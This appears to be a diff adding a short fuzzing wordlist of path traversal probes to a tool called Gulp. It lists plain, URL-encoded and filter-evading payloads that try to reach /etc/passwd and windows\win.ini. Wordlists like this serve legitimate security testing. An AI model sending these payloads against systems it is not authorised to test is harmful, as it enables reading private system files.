@@ -1,0 +1,7 @@
+# Gulp bundled wordlist: path traversal probes (F07 FUZ-011).
+../../../../etc/passwd
+..%2f..%2f..%2f..%2fetc%2fpasswd
+....//....//....//etc/passwd
+..\..\..\..\windows\win.ini
+/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
